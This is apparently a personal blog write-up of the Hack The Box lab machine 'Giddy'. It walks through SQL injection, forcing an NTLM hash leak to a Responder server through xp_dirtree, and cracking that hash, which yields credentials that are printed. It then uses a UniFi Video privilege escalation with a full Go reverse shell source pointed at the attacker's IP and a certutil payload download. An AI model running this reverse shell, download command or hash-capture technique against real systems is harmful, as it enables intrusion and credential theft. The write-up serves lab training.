Hey there again! Back with another Hackthebox machine write up, this time for the machine Giddy! This was a really fun box, that I enjoyed learning some new things about. Some of the topics that will be covered on this box are:

- xp_dirtree
- Responder NTLM hash capture
- Ubiquiti Windows Priv esc
- Cross compiling Go reverse shells.

If all this sounds cool to you, then let's jump in!


Nmap Output
-----------

```sh
Nmap scan report for 10.10.10.104
Host is up (0.041s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
|_ssl-date: 2019-01-30T00:26:41+00:00; +4m42s from scanner time.
| tls-alpn:
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2019-01-28T03:10:23
|_Not valid after:  2019-07-30T03:10:23
|_ssl-date: 2019-01-30T00:26:41+00:00; +4m42s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m41s, deviation: 0s, median: 4m41s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 29 19:22:01 2019 -- 1 IP address (1 host up) scanned in 24.57 seconds
```


So from this initial nmap scan, there are only a few ports to work with. So let's start with ones with the biggest attack surface, the web ports.


Web Ports
---------


So port 80 just redirects to HTTPS, or port 443, so this is what I'll be focusing on.


![](/assets/images/Giddy/Giddy-HomePage.png)



The initial homepage is just a picture of a "giddy" dog, which upon downloading a running a few stegonography tools against it, doesn't yield much.



After that, running a quick gobuster scan reveals two interesting ports as seen below:

```sh
gobuster -u https://10.10.10.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 20

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.104/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/02/15 20:23:33 Starting gobuster
=====================================================
/remote (Status: 302)
/mvc (Status: 301)
```


So the first directory, `/remote` shows that it's redirecting us to something else. Let's check this out. 

<remote image>


Going to `/remote` redirets our web broswer to `https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%2fremote` as seen above.

I could try brute forcing some login credentials, but it this seems like it's a web portal for a remote powershell session, and since there is also Remote Desktop running on this box, we must need to get credentials another way.

Next, let's check the `/mvc` directory that was found.

<mvc image>

Clicking around on this page, reveals this url: `https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=27`

This looks like an excellent place to attempt an SQLi. Capturing this request in Burp Suite, I saved the request and ran it through sqlmap.

<sqlmap output>


After finding this SQLi injection, I then tried to dump all the tables, get some passwords, get a working SQL shell/OOB shell, the usual stuff. Nothing seemed to work.

I would get a `xp_cmdshell` session through SQLmap, but I couldn't get any true remote exectution to work. 
Doing some digging into how exactly `xp_cmdtree` works and what is going on to actually allow SQL make system commands, I ran into a another SQL command similar to this called `xp_dirtree`.

These commands are called extended stored procedures, and lets look a bit closer at what these procedures are doing and how they are used.


XP extended Stored Procedures
-----------------------------

So first looking into `xp_cmdshell` which is used more widely in offensive security engagements, when it's presented to attackers. `xp_cmdshell` spawns a windows command shell and takes an arguement, and executes it on the host system. This is obviously very advantagous to any attacker that can leverage it on an improperly managed SQL server.

Now, let's dig into `xp_dirtree`. This SQL procedure is used to list out all the contents of any directory on the host machine. It will display the contnets of any folder that you provide it as an argument. This can be somewhat dangerous for seeing any sensitive files that might be on the server. Bear in mind an attacker could not "read" any of these files, only see that the files exist.   


Abusing xp_dirtree
------------------

Now let's use this procedure to our advantage. So we have a somewhat working shell using `xp_cmdshell` and we know that we can execute this other xp procedure to list out directories. We should remember too that SMB is active on this box as well, so this will be our way to gather credentials. On Windows, when you try to access a network share, you treat it as a directory you access. See where this is going...?

So on a Windows machine, you press Ctl+r and type in `\\<HostToConnectTo\DirectoryToAccess` and if you have the proper permissions, you'll connect to that network share. And the way that permissions are checked, is that Windows sends NTLM authentication to the remote host to see if that user has access to that share or not.

So what would happen if we host our own SMB server, use the `xp_dirtree` procedure to connect back to our malicious server, and we collect the credentials sent to us? Let's see below:


- First lets start our malicious server


```sh
┌─[root@mainframe]─[/opt/impacket/examples]
└──╼ # responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 2.3.3.9

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CRTL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.21]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...

```

Now that we have that listening on our VPN, let's try and connect to it and see what comes of it.


```sh
EXEC Master.dbo.xp_dirtree"\\10.10.14.13\x",1,1;
```

Now let's check our evil SMB server

```sh
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.104
[SMBv2] NTLMv2-SSP Username : GIDDY\Stacy
[SMBv2] NTLMv2-SSP Hash     : Stacy::GIDDY:bbd6be647720e298:026DC1236395B326846EE032BEFE5F6C:0101000000000000C0653150DE09D201200F16EDB495876A000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000090FF2D613632E3CA330587F1FE485D45EB17759DB4200B8C0F25925583AD81070A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003100000000000000000000000000
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
[*] Skipping previously captured hash for GIDDY\Stacy
```

Boom! We have an NTLM hash! Looks like we were executing under a user named Stacy, and she sent her hash to us, unwillingly. How nice! Let's get to cracking this hash now!


Cracking NTLM Hash
------------------
This is not a complicated job, just requires patience. 

We simply save this hash into a file (Including the `Stacy::GIDDY` part) and run the cracking tool `john` against it. I used rockyou.txt as a wordlist and ended up with these credentials:

```sh
Stacy:xNnWo6272k7x
```
Now let's try these against the `/remote` login page we ran into earlier.




Powershell Remote Access Login
------------------------------

Plugging in the credentials that we obtained from our SMB server, but using the username `GIDDY\Stacy` to ensure we log into the local machine and not try to authenticate with any domain, we are presented with a Powershell console.


<Powershell_screenshot>


Here we can read the user flag as well!

<UserFlag_Screenshot>


Now that we have this "shell" let's try to escalate our privileges!



Unifi Privilege Escalation
--------------------------

Looking within the directory it started us out in, we see an interesting file called `unifivideo` which just contains the word `stop`.

Unifi is the software used by Ubiquiti networking equipment. Looking into this for any known vulnerabilities, there is one that is comes up for UniFi video ( https://www.exploit-db.com/exploits/43390 ) which is a local privilege escalation vulnerability. Seems like exactly what we need.


The basic explanation of this vulnerability is that Ubiquiti IP based surveillence cameras come with a software package called UniFi Video. This software gets installed under the `C:\ProgramData\unifi-video\` directory, which has very lax permissions. When the UniFi Video service starts and stops, it searches for an executable with this path: `C:\ProgramData\unifi-video\taskkill.exe`. This `taskkill.exe` does not exist and is not included with installing this program. UniFi Video also happens to run with NTAUTHORITY\SYSTEM permissions, so....

Anyway, if a malicious actor, AKA us, creates an executable with the name `taskkill.exe` and put it into the install directory we can restart the service and have it execute whatever we'd like. Seems easy enough, so let's jump into it!



Crafting Privilege Escalation Exploit
-------------------------------------

At first, it seemed easy enough to use `msfvenom` to create a malicious executable with a reverse shell, upload it to the target, and get a shell. Unfortunately, this does not work. I can't really explain why this doesn't work, other than some sort of AV protection going on. 

After many, many, MANY failed attempts, I started thinking about ways to manually develope and compile my own executables. After all these attempts, I found myself researching reverse shells written in the Golang programming langauge. Golang, or Go, is a very fast and cross platform compiled langauge that's really picked up in the programming community as a replacement for C programming. 

After failing to try and write my own reverse shell, I found a Github repository that contained some very useful Go reverse shells for Windows and Linux! Link: https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e


Once grabbing the Windows reverse shell code, I had to create an executable from it. Similar to using `gcc` in order to compile C code into an executable, we will use the `go` command to do the same. We have to set some special flags as well in order to make sure this works on a Windows x64 machine, since we are working on a Linux attack machine. The final Go code looks like the following:

```go
# cat rev.go
// +build windows

// Reverse Windows CMD
// Test with nc -lvvp 6666
package main

import (
        "bufio"
        "net"
        "os/exec"
        "syscall"
        "time"
)

func main() {
        reverse("10.10.14.21:443")
}

func reverse(host string) {
        c, err := net.Dial("tcp", host)
        if nil != err {
                if nil != c {
                        c.Close()
                }
                time.Sleep(time.Minute)
                reverse(host)
        }

        r := bufio.NewReader(c)
        for {
                order, err := r.ReadString('\n')
                if nil != err {
                        c.Close()
                        reverse(host)
                        return
                }

                cmd := exec.Command("cmd", "/C", order)
                cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
                out, _ := cmd.CombinedOutput()

                c.Write(out)
        }
}
```
Now we just need to run the command to compile this into an executable, which is seen below:

`env GOOS=windows GOARCH=amd64 go build rev.go`

The command is pretty self explanatory, setting the OS to windows and architecture to 64 bit, and then build the go file.

The result an executable called `rev.exe` which is fine for now, but remember we will have to rename it later.


Uploading Reverse Shell
-----------------------

Now we have to get this onto the target machine. For this we will utilize the `certutil.exe` command for this. We will start a Python Simple HTTP Server and run the following on the Powershell console to upload our file: `certutil.exe -split -f -urlcache http://10.10.14.21/rev.exe C:\ProgramData\unifi-video\taskkill.exe`


<Upload_Screenshot>


Restarting UniFi Video Service
------------------------------


This is another concept that seems easy at first, but certain aspects hinder our execution. Now that we have the `taskkill.exe` where it should be, we should just restart the service and get our shell. We need to restart the unifi-video in order to exectue our shell, but we need to know the service name in order to this.

Normally, running `Get-Service` on Powershell would show running and stopped services on the host, but we receive the following error:


<Error_image>


So now I have to find a way of enumerating what the service name is. Powershell has a file that is similar to the `.bash_history` file in Linux called `ConsoleHost_history.txt` So Going to the file and checking the contents reveals the following:

```powershell
PS C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline>
type .\ConsoleHost_history.txt
net stop unifivideoservice
$ExecutionContext.SessionState.LanguageMode
Stop-Service -Name Unifivideoservice -Force
Get-Service -Name Unifivideoservice
whoami
Get-Service -ServiceName UniFiVideoService
PS C:\Users\Stacy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline>
``` 


So now with our file in place, and the command to run restart the UniFi Video service, we set up an `nc` listener and hope to catch a shell. 


<Start_service pic>




```sh
# nc -nvlp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.104.
Ncat: Connection from 10.10.10.104:49787.

whoami
nt authority\system
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.10.10.104
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{2B65B401-B87A-41A4-8EAC-7ACD450564E4}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
hostname
Giddy
dir C:\Users\Administrator\Desktop
 Volume in drive C is Windows 2016
 Volume Serial Number is 0828-8CAE

 Directory of C:\Users\Administrator\Desktop

06/17/2018  09:53 AM    <DIR>          .
06/17/2018  09:53 AM    <DIR>          ..
06/17/2018  09:53 AM                32 root.txt
06/16/2018  08:54 PM               842 Ubiquiti UniFi Video.lnk
               2 File(s)            874 bytes
               2 Dir(s)  42,973,868,032 bytes free
```

 
We see in our nc shell that we get a call from the IP of Giddy, but there is no real terminal output, but once issuing a command, it shows that we have a shell!

Better yet, we have an administrator shell, so we know that this exploit worked as expected and we have owned this box!


This was a really fun box to learn, with many unique vectors and clear paths to continue, which I always appreciate!

I hope you have enjoyed this write-up, even though it ran on the longer side, I had a good time writing it. Give me some feedback on Twitter if you have any suggestions. 

Until next week!

-Anubis
 
